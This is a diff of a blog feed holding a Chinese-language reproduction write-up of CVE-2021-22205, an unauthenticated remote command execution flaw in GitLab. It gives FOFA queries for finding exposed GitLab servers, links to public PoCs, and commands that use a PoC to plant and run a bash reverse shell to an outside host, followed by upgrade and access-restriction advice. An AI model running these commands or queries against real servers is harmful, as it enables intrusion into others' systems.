-<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="版本检测"><a href="#版本检测" class="headerlink" title="版本检测"></a>版本检测</h4><p>相关用户可通过版本检测的方法判断当前应用是否存在风险。<br>使用如下命令可查看当前GitLab的版本：</p>
-<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"></p>
-<h4 id="官方升级"><a href="#官方升级" class="headerlink" title="官方升级"></a>官方升级</h4><p>目前官方已发布新版本修复了该漏洞，请受影响的用户尽快升级至最新版本进行防护，官方下载链接如下：<a href="https://about.gitlab.com/update/">https://about.gitlab.com/update/</a></p>
-<h4 id="临时防护措施"><a href="#临时防护措施" class="headerlink" title="临时防护措施"></a>临时防护措施</h4><p>若相关用户暂时无法进行升级操作，可使用白名单限制对Web端口的访问。配置访问控制策略，避免受影响的GitLab暴露在公网</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/cn-gov/p/15490588.html">https://www.cnblogs.com/cn-gov/p/15490588.html</a><br><a href="https://zhuanlan.zhihu.com/p/426847373">https://zhuanlan.zhihu.com/p/426847373</a><br><a href="https://www.cnblogs.com/ybit/p/14918949.html">https://www.cnblogs.com/ybit/p/14918949.html</a><br><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2021.11</tag>
       </tags>
   </entry>
   <entry>
@@ -723,6 +685,44 @@ app&#x3D;&quot;Joomla&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hid
       </categories>
       <tags>
         <tag>2021.3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【CVE-2021-22205】GitLab 远程命令执行漏洞复现</title>
+    <url>/2021/11/07/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;GitLab&quot;
+app&#x3D;&quot;GitLab&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<a id="more"></a>
+
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。<br>由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用，社区版(CE)和企业版(EE)皆受影响。由于GitLab中的ExifTool没有对传入的图像文件的扩展名进行正确处理，攻击者通过上传特制的恶意图片，可以在目标服务器上执行任意命令。<br><strong>根本原因</strong><br>1.当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。<br>2.其中一个支持的格式是DjVu。当解析DjVu注释时，标记被赋值为convert C escape sequences。</p>
+<p>Gitlab链接：<br><a href="https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/">https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/</a></p>
+<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：9.9 | 高危</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>11.9 &lt;= Gitlab CE/EE &lt; 13.8.8<br>12.13.9 &lt;= Gitlab CE/EE &lt; 13.9.6<br>13.13.10 &lt;= Gitlab CE/EE &lt; 13.10.3</p>
+<h3 id="漏洞PoC"><a href="#漏洞PoC" class="headerlink" title="漏洞PoC"></a>漏洞PoC</h3><p><a href="https://github.com/RedTeamWing/CVE-2021-22205">https://github.com/RedTeamWing/CVE-2021-22205</a><br><a href="https://github.com/Al1ex/CVE-2021-22205">https://github.com/Al1ex/CVE-2021-22205</a></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="证明存在"><a href="#证明存在" class="headerlink" title="证明存在"></a>证明存在</h4><p>先修改PoC里面的dnslog地址为自己的<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>利用PoC，我这里用的是pocsuite3测试框架<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>发现自己的dnslog有回显，证明利用成功，该站存在此漏洞<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这里利用的是前面的第二个PoC</p>
+<pre class="line-numbers language-none"><code class="language-none">反弹shell：
+
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;chmod +x &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，对写入成功的sh脚本加执行权限
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，运行反弹shell脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="版本检测"><a href="#版本检测" class="headerlink" title="版本检测"></a>版本检测</h4><p>相关用户可通过版本检测的方法判断当前应用是否存在风险。<br>使用如下命令可查看当前GitLab的版本：</p>
+<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"></p>
+<h4 id="官方升级"><a href="#官方升级" class="headerlink" title="官方升级"></a>官方升级</h4><p>目前官方已发布新版本修复了该漏洞，请受影响的用户尽快升级至最新版本进行防护，官方下载链接如下：<a href="https://about.gitlab.com/update/">https://about.gitlab.com/update/</a></p>
+<h4 id="临时防护措施"><a href="#临时防护措施" class="headerlink" title="临时防护措施"></a>临时防护措施</h4><p>若相关用户暂时无法进行升级操作，可使用白名单限制对Web端口的访问。配置访问控制策略，避免受影响的GitLab暴露在公网</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/cn-gov/p/15490588.html">https://www.cnblogs.com/cn-gov/p/15490588.html</a><br><a href="https://zhuanlan.zhihu.com/p/426847373">https://zhuanlan.zhihu.com/p/426847373</a><br><a href="https://www.cnblogs.com/ybit/p/14918949.html">https://www.cnblogs.com/ybit/p/14918949.html</a><br><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.11</tag>
       </tags>
   </entry>
   <entry>
